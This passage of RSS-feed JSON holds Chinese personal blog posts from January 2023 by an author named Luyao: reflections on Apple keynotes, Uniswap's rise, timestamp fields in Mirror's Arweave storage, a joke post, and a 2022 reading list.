          "description": "<p>很碰巧地，拉屎时看了 Youtube 给我推的 iMac, MacBook Air, iPod 的发布会，我发现了一个共同点。</p>\n<p>他要发布的产品都会在比较后面才拿出来，那前面都在讲什么呢？<strong>讲问题</strong>。</p>\n<ul>\n<li>\n<p><a href=\"https://www.youtube.com/watch?v=0BHPtoTctDY\"   target=\"_blank\" >iMac</a> 发布前讲显示糟糕、性能低下、样式笨重的传统 PC；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/OIV6peKMj9M\"   target=\"_blank\" >MacBook Air</a> 发布前讲 Sony 的做了很多妥协且并不轻薄的轻薄本；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/kN0SVBCJqLs\"   target=\"_blank\" >iPod</a> 发布前讲市面上的 CD 机、mp3 的容量问题；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/VQKMoT-6XSg\"   target=\"_blank\" >iPhone</a> 发布前则在讲并不 smart 的 smartphone，以及交互方式等一大堆问题。</p>\n</li>\n</ul>\n<p>这些问题实际上都是用户的问题，随着发布的产品，通常在这些问题上都会有质的飞跃。<strong>台下观众感到兴奋，不是因为这个东西有多炫酷，或者某个性能多极致，而是因为真实存在的问题被解决了</strong>。</p>\n<p>这也是苹果的精髓所在，我是这么认为的。</p>\n<p>（当我想起老罗时，我常怀疑他对此的理解有偏差。）</p>\n",
          "content": "<p>很碰巧地，拉屎时看了 Youtube 给我推的 iMac, MacBook Air, iPod 的发布会，我发现了一个共同点。</p>\n<p>他要发布的产品都会在比较后面才拿出来，那前面都在讲什么呢？<strong>讲问题</strong>。</p>\n<ul>\n<li>\n<p><a href=\"https://www.youtube.com/watch?v=0BHPtoTctDY\"   target=\"_blank\" >iMac</a> 发布前讲显示糟糕、性能低下、样式笨重的传统 PC；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/OIV6peKMj9M\"   target=\"_blank\" >MacBook Air</a> 发布前讲 Sony 的做了很多妥协且并不轻薄的轻薄本；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/kN0SVBCJqLs\"   target=\"_blank\" >iPod</a> 发布前讲市面上的 CD 机、mp3 的容量问题；</p>\n</li>\n<li>\n<p><a href=\"https://youtu.be/VQKMoT-6XSg\"   target=\"_blank\" >iPhone</a> 发布前则在讲并不 smart 的 smartphone，以及交互方式等一大堆问题。</p>\n</li>\n</ul>\n<p>这些问题实际上都是用户的问题，随着发布的产品，通常在这些问题上都会有质的飞跃。<strong>台下观众感到兴奋，不是因为这个东西有多炫酷，或者某个性能多极致，而是因为真实存在的问题被解决了</strong>。</p>\n<p>这也是苹果的精髓所在，我是这么认为的。</p>\n<p>（当我想起老罗时，我常怀疑他对此的理解有偏差。）</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/problem/",
          "creator": "Luyao",
          "pubDate": "Mon, 23 Jan 2023 23:03:36 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "6d2638e17a03c09ddf59406a3e925df1",
          "highlights": []
        },
        {
          "title": "Uniswap 的启发",
          "description": "<p>起初，我考古读到了这篇文章，当时很热门：</p>\n<p><a href=\"https://medium.com/dragonfly-research/what-explains-the-rise-of-amms-7d008af1c399\"   target=\"_blank\" >What Explains the Rise of AMMs</a></p>\n<p>他从几个角度去解释 AMM 的崛起，比如 gas 低、抗监管、提供流动性方便、LP 激励……</p>\n<p>然后我就很好奇，我想看看 Uni 创始人是怎么说的，毕竟他从头到尾经历了整个过程。</p>\n<p>于是我搜到了这篇，是彭博社对他的一个访谈</p>\n<p><a href=\"https://www.bnnbloomberg.ca/transcript-hayden-adams-explains-uniswap-and-the-rise-of-defi-1.1600662\"   target=\"_blank\" >Hayden Adams Explains Uniswap and the Rise of Defi</a></p>\n<p>很有意思，他对此的解释，跟前面那人完全不一样，而且非常简单好懂。</p>\n<p>他觉得 Uni 起来的重点是满足了长尾市场。传统做市商不会给小资产做市，AMM 的好处是不需要做市商，所以解放了长尾资产。</p>\n<p>他还打了超级有趣的比方，我头一次听到这种说法。他说用户可以很容易地创建交易对，这有点像 UGC 内容，<strong>就像 Netflix 和 Youtube 的差别，在 Youtube 上用户自己生成内容，而 Uniswap 对流动性做了同样的事情</strong>。</p>\n<p>这件事还有一个更有意思的地方，就是一开始他好像不是这样想的。</p>\n<p>他不是想：“长尾资产需要交易，AMM 可以完美解决他们的需求，比 orderbook 好多了”。</p>\n<p>并不是。我听过他前年的访谈，当时他说：</p>\n<blockquote>\n<p>“以太坊吸引我的点是不需要信任、不会被下线、不需要许可。但<strong>是当时所有的项目，比如 EtherDelta，都没有这些属性</strong>。所以我开始思考，如果能在以太坊上构建拥有这些属性的项目，会是什么样子。”</p>\n</blockquote>\n<p>我觉得这个差别中有很深刻的意义，但我说不清楚。后来我和李阳讨论这个现象，他觉得可能可以用这样的方式描述：<strong>最开始做工具的人对 a 非常着迷，但真正引爆点是 a 所带来的 b</strong>。</p>\n<p>我同意，就是最开始吸引园丁的是那个土壤，而最终吸引游客的是在那个土壤上生长的花朵。没有那个土壤，就没有那个花朵。</p>\n",
          "content": "<p>起初，我考古读到了这篇文章，当时很热门：</p>\n<p><a href=\"https://medium.com/dragonfly-research/what-explains-the-rise-of-amms-7d008af1c399\"   target=\"_blank\" >What Explains the Rise of AMMs</a></p>\n<p>他从几个角度去解释 AMM 的崛起，比如 gas 低、抗监管、提供流动性方便、LP 激励……</p>\n<p>然后我就很好奇，我想看看 Uni 创始人是怎么说的，毕竟他从头到尾经历了整个过程。</p>\n<p>于是我搜到了这篇，是彭博社对他的一个访谈</p>\n<p><a href=\"https://www.bnnbloomberg.ca/transcript-hayden-adams-explains-uniswap-and-the-rise-of-defi-1.1600662\"   target=\"_blank\" >Hayden Adams Explains Uniswap and the Rise of Defi</a></p>\n<p>很有意思，他对此的解释，跟前面那人完全不一样，而且非常简单好懂。</p>\n<p>他觉得 Uni 起来的重点是满足了长尾市场。传统做市商不会给小资产做市，AMM 的好处是不需要做市商，所以解放了长尾资产。</p>\n<p>他还打了超级有趣的比方，我头一次听到这种说法。他说用户可以很容易地创建交易对，这有点像 UGC 内容，<strong>就像 Netflix 和 Youtube 的差别，在 Youtube 上用户自己生成内容，而 Uniswap 对流动性做了同样的事情</strong>。</p>\n<p>这件事还有一个更有意思的地方，就是一开始他好像不是这样想的。</p>\n<p>他不是想：“长尾资产需要交易，AMM 可以完美解决他们的需求，比 orderbook 好多了”。</p>\n<p>并不是。我听过他前年的访谈，当时他说：</p>\n<blockquote>\n<p>“以太坊吸引我的点是不需要信任、不会被下线、不需要许可。但<strong>是当时所有的项目，比如 EtherDelta，都没有这些属性</strong>。所以我开始思考，如果能在以太坊上构建拥有这些属性的项目，会是什么样子。”</p>\n</blockquote>\n<p>我觉得这个差别中有很深刻的意义，但我说不清楚。后来我和李阳讨论这个现象，他觉得可能可以用这样的方式描述：<strong>最开始做工具的人对 a 非常着迷，但真正引爆点是 a 所带来的 b</strong>。</p>\n<p>我同意，就是最开始吸引园丁的是那个土壤，而最终吸引游客的是在那个土壤上生长的花朵。没有那个土壤，就没有那个花朵。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/mud_and_flower/",
          "creator": "Luyao",
          "pubDate": "Tue, 17 Jan 2023 23:47:48 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "87735080520216b76418200f8757bab9",
          "highlights": []
        },
        {
          "title": "💩💩💩💩💩💩💩💩💩💩",
          "description": "<p>为避免我的博客太严肃太正经，我应该定期发一些没有意义甚至羞耻的东西，来时刻提醒自己：我就 tm 瞎写写。</p>\n<p>但很遗憾的是，有了这一段说明，本篇又有意义了，草。</p>\n",
          "content": "<p>为避免我的博客太严肃太正经，我应该定期发一些没有意义甚至羞耻的东西，来时刻提醒自己：我就 tm 瞎写写。</p>\n<p>但很遗憾的是，有了这一段说明，本篇又有意义了，草。</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/shit/",
          "creator": "Luyao",
          "pubDate": "Tue, 17 Jan 2023 13:05:44 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "573752fda75d4c09f508812ce52a34a7",
          "highlights": []
        },
        {
          "title": "一个微不足道的细节",
          "description": "<p>考你一个问题：如果 Mirror 挂了，你还能用它吗？</p>\n<p>答案是：<strong>不能</strong>。</p>\n<p>能读，但是不能写。</p>\n<p>所以我觉得它不是很 protocol，还是更像应用一点，而 Uniswap 就哪怕网站挂了也不影响使用。</p>\n<p>之所以想到这个，是因为我早上在想另一个小问题：<strong>内容要不要存储 “发布时间”？</strong></p>\n<p>目前往 Arweave 存内容的协议像 Mirror 之类，都是在存一个 json，里面包含一个时间字段：</p>\n<p><img src=\"https://zhangluyao.com/images/mirror/mirror_json.png\" alt=\"mirror_json\"></p>\n<p>但这个时间我觉得是没用的。</p>\n<p>一方面，AR 的区块本身有 timestamp。</p>\n<p>另一方面，如果这个协议是无门槛，谁都能用的，那就无法确保这个时间真的是发布时间，我可以乱写一个时间。</p>\n<p><strong>所以这个时间字段实际上是没有意义的。</strong> 除非所有内容都发布自你自己的网页客户端，就像 Mirror。</p>\n<p>这是个微不足道的小细节，但我发现深入想下来，就会意识到很多东西。</p>\n<p>最终设计成 protocol 还是 app，许多决定可能是不一样的。</p>\n<p><em>（P.S. 后来我意识到，这个字段也并非没有意义，比如当你把博客迁移到 Mirror，每篇文章都有个写作日期，这种情况下还是需要一个时间，也不能只看区块的 timestamp……）</em></p>\n",
          "content": "<p>考你一个问题：如果 Mirror 挂了，你还能用它吗？</p>\n<p>答案是：<strong>不能</strong>。</p>\n<p>能读，但是不能写。</p>\n<p>所以我觉得它不是很 protocol，还是更像应用一点，而 Uniswap 就哪怕网站挂了也不影响使用。</p>\n<p>之所以想到这个，是因为我早上在想另一个小问题：<strong>内容要不要存储 “发布时间”？</strong></p>\n<p>目前往 Arweave 存内容的协议像 Mirror 之类，都是在存一个 json，里面包含一个时间字段：</p>\n<p><img src=\"https://zhangluyao.com/images/mirror/mirror_json.png\" alt=\"mirror_json\"></p>\n<p>但这个时间我觉得是没用的。</p>\n<p>一方面，AR 的区块本身有 timestamp。</p>\n<p>另一方面，如果这个协议是无门槛，谁都能用的，那就无法确保这个时间真的是发布时间，我可以乱写一个时间。</p>\n<p><strong>所以这个时间字段实际上是没有意义的。</strong> 除非所有内容都发布自你自己的网页客户端，就像 Mirror。</p>\n<p>这是个微不足道的小细节，但我发现深入想下来，就会意识到很多东西。</p>\n<p>最终设计成 protocol 还是 app，许多决定可能是不一样的。</p>\n<p><em>（P.S. 后来我意识到，这个字段也并非没有意义，比如当你把博客迁移到 Mirror，每篇文章都有个写作日期，这种情况下还是需要一个时间，也不能只看区块的 timestamp……）</em></p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/mirror/",
          "creator": "Luyao",
          "pubDate": "Sat, 14 Jan 2023 13:08:34 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "f880b4449cdd50889a30306212f3f087",
          "highlights": []
        },
        {
          "title": "Books 2022",
          "description": "<p>2022 年读的书，对一些我觉得比较有趣的做了标记。</p>\n<ul>\n<li>\n<p><a href=\"https://book.douban.com/subject/27079024/\"   target=\"_blank\" >投资者的心灵修炼</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26822680/\"   target=\"_blank\" >写出我心</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26451505/\"   target=\"_blank\" >伯罗奔尼撒战争</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27156012/\"   target=\"_blank\" >美国增长的起落</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11441867/\"   target=\"_blank\" >最佳可能的世界：数学与命运</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4908885/\"   target=\"_blank\" >局外人</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3788397/\"   target=\"_blank\" >豺狼的日子</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30380272/\"   target=\"_blank\" >复仇者</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35593780/\"   target=\"_blank\" >工作，消费主义和新穷人</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1919172/\"   target=\"_blank\" >主权个人</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4312810/\"   target=\"_blank\" >裸猿</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3519900/\"   target=\"_blank\" >太空异客</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35296788/\"   target=\"_blank\" >心灵侦探城塚翡翠</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/33464162/\"   target=\"_blank\" >货币的非国家化</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35462687/\"   target=\"_blank\" >盲视</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35005083/\"   target=\"_blank\" >第三帝国的兴亡</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35050691/\"   target=\"_blank\" >反美阴谋</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/33391930/\"   target=\"_blank\" >一场游戏一次消遣</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26836970/\"   target=\"_blank\" >沙丘</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27619988/\"   target=\"_blank\" >发现心流</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4113090/\"   target=\"_blank\" >我们台湾这些年</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1140729/\"   target=\"_blank\" >星船伞兵</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11519297/\"   target=\"_blank\" >台湾往事：口述历史</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/34852465/\"   target=\"_blank\" >走向辛亥</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4312829/\"   target=\"_blank\" >亲密行为</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30273539/\"   target=\"_blank\" >金融怪杰</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/5243775/\"   target=\"_blank\" >聪明的投资者</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35791941/\"   target=\"_blank\" >达摩流浪者</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/24845545/\"   target=\"_blank\" >阿桑奇自传：不能说的秘密</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30422543/\"   target=\"_blank\" >涌变</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/25903505/\"   target=\"_blank\" >蛤蟆的油</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35292726/\"   target=\"_blank\" >Unix 传奇</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1563515/\"   target=\"_blank\" >斑马为什么不得胃溃疡</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4820710/\"   target=\"_blank\" >1984</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3608208/\"   target=\"_blank\" >牧羊少年的奇幻之旅</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3348590/\"   target=\"_blank\" >好满足</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26854560/\"   target=\"_blank\" >巨匠的技与心</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30396711/\"   target=\"_blank\" >海鸥乔纳森</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35265732/\"   target=\"_blank\" >鱼料理：从海洋到餐桌</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26264967/\"   target=\"_blank\" >神们自己</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27154627/\"   target=\"_blank\" >图解咖啡的奇趣之旅</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27194483/\"   target=\"_blank\" >知更鸟</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26861459/\"   target=\"_blank\" >环界1</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26861460/\"   target=\"_blank\" >环界2</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26907067/\"   target=\"_blank\" >环界3</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3292851/\"   target=\"_blank\" >神秘之球</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27039412/\"   target=\"_blank\" >流吧，我的眼泪</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35268281/\"   target=\"_blank\" >其主之声</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35049755/\"   target=\"_blank\" >索拉里斯星</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/2082251/\"   target=\"_blank\" >The Power of Now</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/24758481/\"   target=\"_blank\" >当下的力量</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30282317/\"   target=\"_blank\" >甲午战争</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/10472702/\"   target=\"_blank\" >重说中国近代史</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35140470/\"   target=\"_blank\" >洞见：为什么佛教的是真的</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27174130/\"   target=\"_blank\" >北野武的小酒馆</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26734553/\"   target=\"_blank\" >菩提树下的微笑</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35595861/\"   target=\"_blank\" >混沌</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1478831/\"   target=\"_blank\" >当鞋子合脚时</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/10783733/\"   target=\"_blank\" >How the world works (by Noam Chomsky)</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27172218/\"   target=\"_blank\" >全面回忆：菲利普迪克短篇小说全集5</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30295356/\"   target=\"_blank\" >预见未来：菲利普迪克短篇小说全集3</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26369699/\"   target=\"_blank\" >被讨厌的勇气</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1322455/\"   target=\"_blank\" >遥远的救世主</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35623897/\"   target=\"_blank\" >众神的植物</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35541418/\"   target=\"_blank\" >时间的褶皱</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11273476/\"   target=\"_blank\" >The Winner Effect</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/20424526/\"   target=\"_blank\" >邓小平时代</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/6265745/\"   target=\"_blank\" >银河系搭车客指南</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1477437/\"   target=\"_blank\" >唐人故事</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27179933/\"   target=\"_blank\" >死水微澜</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3910883/\"   target=\"_blank\" >观呼吸</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30141667/\"   target=\"_blank\" >乌托邦年代</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/33424487/\"   target=\"_blank\" >时间的秩序</a> 👍</p>\n</li>\n</ul>\n",
          "content": "<p>2022 年读的书，对一些我觉得比较有趣的做了标记。</p>\n<ul>\n<li>\n<p><a href=\"https://book.douban.com/subject/27079024/\"   target=\"_blank\" >投资者的心灵修炼</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26822680/\"   target=\"_blank\" >写出我心</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26451505/\"   target=\"_blank\" >伯罗奔尼撒战争</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27156012/\"   target=\"_blank\" >美国增长的起落</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11441867/\"   target=\"_blank\" >最佳可能的世界：数学与命运</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4908885/\"   target=\"_blank\" >局外人</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3788397/\"   target=\"_blank\" >豺狼的日子</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30380272/\"   target=\"_blank\" >复仇者</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35593780/\"   target=\"_blank\" >工作，消费主义和新穷人</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1919172/\"   target=\"_blank\" >主权个人</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4312810/\"   target=\"_blank\" >裸猿</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3519900/\"   target=\"_blank\" >太空异客</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35296788/\"   target=\"_blank\" >心灵侦探城塚翡翠</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/33464162/\"   target=\"_blank\" >货币的非国家化</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35462687/\"   target=\"_blank\" >盲视</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35005083/\"   target=\"_blank\" >第三帝国的兴亡</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35050691/\"   target=\"_blank\" >反美阴谋</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/33391930/\"   target=\"_blank\" >一场游戏一次消遣</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26836970/\"   target=\"_blank\" >沙丘</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27619988/\"   target=\"_blank\" >发现心流</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4113090/\"   target=\"_blank\" >我们台湾这些年</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1140729/\"   target=\"_blank\" >星船伞兵</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11519297/\"   target=\"_blank\" >台湾往事：口述历史</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/34852465/\"   target=\"_blank\" >走向辛亥</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4312829/\"   target=\"_blank\" >亲密行为</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30273539/\"   target=\"_blank\" >金融怪杰</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/5243775/\"   target=\"_blank\" >聪明的投资者</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35791941/\"   target=\"_blank\" >达摩流浪者</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/24845545/\"   target=\"_blank\" >阿桑奇自传：不能说的秘密</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30422543/\"   target=\"_blank\" >涌变</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/25903505/\"   target=\"_blank\" >蛤蟆的油</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35292726/\"   target=\"_blank\" >Unix 传奇</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1563515/\"   target=\"_blank\" >斑马为什么不得胃溃疡</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/4820710/\"   target=\"_blank\" >1984</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3608208/\"   target=\"_blank\" >牧羊少年的奇幻之旅</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3348590/\"   target=\"_blank\" >好满足</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26854560/\"   target=\"_blank\" >巨匠的技与心</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30396711/\"   target=\"_blank\" >海鸥乔纳森</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35265732/\"   target=\"_blank\" >鱼料理：从海洋到餐桌</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26264967/\"   target=\"_blank\" >神们自己</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27154627/\"   target=\"_blank\" >图解咖啡的奇趣之旅</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27194483/\"   target=\"_blank\" >知更鸟</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26861459/\"   target=\"_blank\" >环界1</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26861460/\"   target=\"_blank\" >环界2</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26907067/\"   target=\"_blank\" >环界3</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3292851/\"   target=\"_blank\" >神秘之球</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27039412/\"   target=\"_blank\" >流吧，我的眼泪</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35268281/\"   target=\"_blank\" >其主之声</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35049755/\"   target=\"_blank\" >索拉里斯星</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/2082251/\"   target=\"_blank\" >The Power of Now</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/24758481/\"   target=\"_blank\" >当下的力量</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30282317/\"   target=\"_blank\" >甲午战争</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/10472702/\"   target=\"_blank\" >重说中国近代史</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35140470/\"   target=\"_blank\" >洞见：为什么佛教的是真的</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27174130/\"   target=\"_blank\" >北野武的小酒馆</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26734553/\"   target=\"_blank\" >菩提树下的微笑</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35595861/\"   target=\"_blank\" >混沌</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1478831/\"   target=\"_blank\" >当鞋子合脚时</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/10783733/\"   target=\"_blank\" >How the world works (by Noam Chomsky)</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27172218/\"   target=\"_blank\" >全面回忆：菲利普迪克短篇小说全集5</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30295356/\"   target=\"_blank\" >预见未来：菲利普迪克短篇小说全集3</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/26369699/\"   target=\"_blank\" >被讨厌的勇气</a> 👍</p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1322455/\"   target=\"_blank\" >遥远的救世主</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35623897/\"   target=\"_blank\" >众神的植物</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/35541418/\"   target=\"_blank\" >时间的褶皱</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/11273476/\"   target=\"_blank\" >The Winner Effect</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/20424526/\"   target=\"_blank\" >邓小平时代</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/6265745/\"   target=\"_blank\" >银河系搭车客指南</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/1477437/\"   target=\"_blank\" >唐人故事</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/27179933/\"   target=\"_blank\" >死水微澜</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/3910883/\"   target=\"_blank\" >观呼吸</a></p>\n</li>\n<li>\n<p><a href=\"https://book.douban.com/subject/30141667/\"   target=\"_blank\" >乌托邦年代</a></p>\n</li>\n<li>\n<p><a 